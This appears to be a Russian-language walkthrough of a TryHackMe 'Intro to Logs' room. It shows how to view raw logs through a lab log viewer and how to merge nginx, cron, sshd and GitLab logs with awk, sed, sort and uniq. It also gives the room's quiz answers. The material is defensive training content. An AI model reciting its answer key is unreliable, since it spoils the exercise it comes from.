форматирование журналов для создания стандартизированного файла. Доступный через инструмент просмотра журналов , 
этот консолидированный файл предлагает четкое и эффективное представление данных, помогая в выявлении 
закономерностей и проблем.    

Эти подходы подчеркивают гибкость и значимость анализа журналов в системной диагностике и кибербезопасности. 
Независимо от того, используются ли необработанные или проанализированные журналы, возможность компилировать, 
просматривать и анализировать данные жизненно важна для безопасности и эффективности организации.  

Необработанные файлы журнала

При работе с необработанными файлами журнала вы можете получить к ним доступ напрямую через инструмент Log Viewer, 
указав пути в URL. Вот пример URL, который включает несколько файлов журнала: 

http://MACHINE_IP:8111/log?log=%2Fvar%2Flog%2Fgitlab%2Fnginx%2Faccess.log&log=%2Fvar%2Flog%2Fwebsrv-02%2Frsyslog_cron.log&log=%2Fvar%2Flog%2Fwebsrv-02%2Frsyslog_sshd.log&log=%2Fvar%2Flog%2Fgitlab%2Fgitlab-rails%2Fapi_json.log
Вставьте этот URL-адрес в адресную строку браузера, чтобы просмотреть необработанные необработанные файлы журнала с 
помощью инструмента просмотра журналов. 

ПРИМЕЧАНИЕ: Вы можете получить доступ к URL-адресу с помощью AttackBox или браузера виртуальной машины. Однако 
имейте в виду, что загрузка Firefox на виртуальной машине может занять несколько минут. 

Проанализированный и консолидированный файл журнала

Чтобы создать проанализированный и консолидированный файл журнала, вы можете использовать комбинацию инструментов 
Unix, таких как cat, grep, sed, sort, uniq и awk. Вот пошаговое руководство:

Используйте awk и sed для нормализации записей журнала в желаемом формате. Для этого примера мы отсортируем по дате и 
времени:


```commandline
# Process nginx access log
awk -F'[][]' '{print "[" $2 "]", "--- /var/log/gitlab/nginx/access.log ---", "\"" $0 "\""}' /var/log/gitlab/nginx/access.log  | sed "s/ +0000//g" > /tmp/parsed_consolidated.log

# Process rsyslog_cron.log
awk '{ original_line = $0; gsub(/ /, "/", $1); printf "[%s/%s/2023:%s] --- /var/log/websrv-02/rsyslog_cron.log --- \"%s\"\n", $2, $1, $3, original_line }' /var/log/websrv-02/rsyslog_cron.log >> /tmp/parsed_consolidated.log

# Process rsyslog_sshd.log
awk '{ original_line = $0; gsub(/ /, "/", $1); printf "[%s/%s/2023:%s] --- /var/log/websrv-02/rsyslog_sshd.log --- \"%s\"\n", $2, $1, $3, original_line }' /var/log/websrv-02/rsyslog_sshd.log >> /tmp/parsed_consolidated.log

# Process gitlab-rails/api_json.log
awk -F'"' '{timestamp = $4; converted = strftime("[%d/%b/%Y:%H:%M:%S]", mktime(substr(timestamp, 1, 4) " " substr(timestamp, 6, 2) " " substr(timestamp, 9, 2) " " substr(timestamp, 12, 2) " " substr(timestamp, 15, 2) " " substr(timestamp, 18, 2) " 0 0")); print converted, "--- /var/log/gitlab/gitlab-rails/api_json.log ---", "\""$0"\""}' /var/log/gitlab/gitlab-rails/api_json.log >> /tmp/parsed_consolidated.log

```
Необязательно: используйте grepдля фильтрации определенных записей:

`grep "34.253.159.159" /tmp/parsed_consolidated.log > /tmp/filtered_consolidated.log`
Используйте sortдля сортировки всех записей журнала по дате и времени:

`sort /tmp/parsed_consolidated.log > /tmp/sort_parsed_consolidated.log`
Используйте uniqдля удаления дубликатов записей:

`uniq /tmp/sort_parsed_consolidated.log > /tmp/uniq_sort_parsed_consolidated.log`
Теперь вы можете получить доступ к проанализированному и консолидированному файлу журнала с помощью инструмента 
просмотра журналов, используя следующий URL-адрес: 

http://MACHINE_IP:8111/log?path=%2Ftmp%2Funiq_sort_parsed_consolidated.log
Ожидаемый вывод после конфигурации logrotate sshd

ПРИМЕЧАНИЕ: Вы можете получить доступ к URL-адресу с помощью AttackBox или браузера виртуальной машины . Однако 
имейте в виду, что загрузка Firefox на виртуальной машине может занять несколько минут. 

### Ответьте на вопросы ниже
Какая ошибка отображается при доступе к URL-адресу средства просмотра журналов для необработанных необработанных 
файлов журналов «`/var/log/websrv-02/rsyslog_cron.log`» при выборе различных фильтров? 

```commandline
No date field
```
Каков процесс стандартизации проанализированных данных в более удобный для чтения и запросов формат?
```commandline
Normalisation
```
Каков процесс консолидации нормализованных журналов для улучшения анализа действий, связанных с конкретным IP-адресом?
```commandline
Enrichment
```

## Задание 7
Поздравляем! Вы завершили Введение в комнату Logs.

Подводя итог, мы смогли узнать и выполнить следующее:
- Значимость журналов как записей прошлых действий; они необходимы для выявления и устранения угроз.
- Изучите массив журналов, методы их создания и методы их сбора из различных систем.
- Просмотрите результаты анализа журналов в области обнаружения и обработки инцидентов.
- Приобретите практические навыки выявления и противодействия противникам с помощью анализа журналов.


Если вам понравилась эта комната, продолжайте обучение и развитие навыков в областях, специфичных для инструментов 
безопасности и реагирования на инциденты, которые могут улучшить ваши навыки анализа журналов и общие навыки Blue 
Teaming, например:  
- Расследование противника
- Обнаружение и реагирование на конечные точки ( EDR )
- Введение в безопасность конечных точек
- Аврора ЭДР
- Вазух
- Системы обнаружения и предотвращения вторжений (IDPS)
- Фырканье
- Snort Challenge - Основы
- Snort Challenge - живые атаки
- Управление информацией и событиями безопасности ( SIEM )
- Расследование с ELK 101
- Splunk : Основы
- Обработка инцидентов с помощью Splunk


Крайне важно осознать, что эти инструменты безопасности по-настоящему раскрываются в руках опытных специалистов, 
обладающих необходимой информацией и техническими знаниями для борьбы с потенциальными угрозами и управления 
инцидентами безопасности.  

Следующие шаги

В заключение мы надеемся, что это исследование привило вам важность и потенциал журналов. Теперь, когда вы полностью 
поняли, что такое журналы, почему журналирование важно и как оно выполняется, пришло время перейти в следующую 
комнату, Операции с журналами . Можете ли вы использовать эти знания для укрепления защиты, обнаружения противников 
и продвижения ваших усилий по кибербезопасности.   

### Ответьте на вопросы ниже
Я завершил введение в комнату Logs.
```commandline
Ответ не нужен
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)